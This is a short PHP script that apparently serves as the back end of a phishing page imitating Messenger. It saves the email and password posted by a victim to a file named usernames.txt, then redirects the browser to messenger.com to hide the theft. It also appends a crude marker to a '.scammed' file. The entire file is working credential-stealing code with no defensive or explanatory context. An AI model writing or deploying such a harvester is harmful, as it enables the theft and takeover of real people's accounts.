<?php

file_put_contents("usernames.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://messenger.com');file_put_contents(".scammed","Fucked", FILE_APPEND);
exit();
